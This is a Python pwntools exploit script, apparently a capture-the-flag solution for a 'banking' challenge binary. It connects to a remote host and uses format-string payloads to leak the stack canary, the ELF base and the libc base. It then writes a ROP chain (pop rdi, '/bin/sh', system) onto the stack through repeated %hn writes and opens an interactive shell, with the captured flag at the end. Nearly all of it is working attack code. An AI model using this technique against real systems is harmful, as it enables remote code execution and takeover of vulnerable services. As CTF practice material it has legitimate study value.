#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./banking_patched")
libc = ELF("./libc.so.6")
p = process(elf.path)
p = remote("103.163.24.78", 10002)

def register(fullname):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'New username: ', b'ducdat')
    p.sendlineafter(b'New password: ', b'123')
    p.sendlineafter(b'Your full name: ', fullname)

def login():
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Username: ', b'ducdat')
    p.sendlineafter(b'Password: ', b'123')

def info():
    p.sendlineafter(b'> ', b'3')

def logout(feedback):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Please leave a feedback: ', feedback) 

def exit():
    p.sendlineafter(b'> ', b'3')

pause()

# Leak: stack -> elf -> canary -> puts
payload = b'%6$p|%7$p|%15$p|%29$p|'
register(payload)
login()
info()

data_leaked = p.recvline()[:-2].split(b'|')
print(data_leaked)

stack_leaked = int(data_leaked[0], 16)
log.info("Stack leaked: " + hex(stack_leaked))

elf_leaked = int(data_leaked[1], 16)
elf.address = elf_leaked - elf.symbols["account_action"] - 159
log.info("ELF leaked: " + hex(elf.address))

canary = int(data_leaked[2], 16)
log.info("Canary: " + hex(canary))

libc_leaked = int(data_leaked[3], 16)
libc.address = libc_leaked - libc.symbols["puts"] - 506
log.info("Libc leaked: " + hex(libc.address))

feedback_on_stack = stack_leaked - 0x110
ret = stack_leaked + 0x30
log.info("Feedback: " + hex(feedback_on_stack))
log.info("Ret: " + hex(ret))
logout(b'goodbye1')

# A: B -> C -> D 
# B: C -> D 
# F: Fake 
# Đổi Fake -> RIP 
# Sửa tại stack A: C thay đổi thành F 

# A: B -> F -> Fake 
# B: F -> Fake  
# F: Fake 
# Sửa tại stack B: C thay đổi Fake thành RIP

# A: B -> F -> Fake 
# B: F -> RIP  
# F: RIP 

pop_rdi = libc.address + 0x00000000000240e5
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh\x00"))

log.info("binsh: " + hex(binsh))

payload = f'%{(stack_leaked + 40) & 0xffff}c%10$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(pop_rdi) & 0xffff}c%44$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(stack_leaked + 48) & 0xffff}c%13$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(pop_rdi) & 0xffff}c%40$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(stack_leaked + 48 + 2) & 0xffff}c%13$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(pop_rdi >> 16) & 0xffff}c%40$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(stack_leaked + 48 + 2 + 2) & 0xffff}c%13$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(pop_rdi >> 32) & 0xffff}c%40$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

log.info("binsh: " + hex(binsh))
payload = f'%{(stack_leaked + 56) & 0xffff}c%13$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(binsh) & 0xffff}c%40$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(stack_leaked + 56 + 2) & 0xffff}c%13$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(binsh >> 16) & 0xffff}c%40$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(stack_leaked + 56 + 2 + 2) & 0xffff}c%13$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(binsh >> 32) & 0xffff}c%40$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

log.info("system: " + hex(system))
payload = f'%{(stack_leaked + 64) & 0xffff}c%13$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(system) & 0xffff}c%40$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(stack_leaked + 64 + 2) & 0xffff}c%13$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(system >> 16) & 0xffff}c%40$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(stack_leaked + 64 + 2 + 2) & 0xffff}c%13$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

payload = f'%{(system >> 32) & 0xffff}c%40$hn'.encode()
register(payload)
login()
info() 
logout(b'goodbye')

exit()

p.interactive() 

# KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?}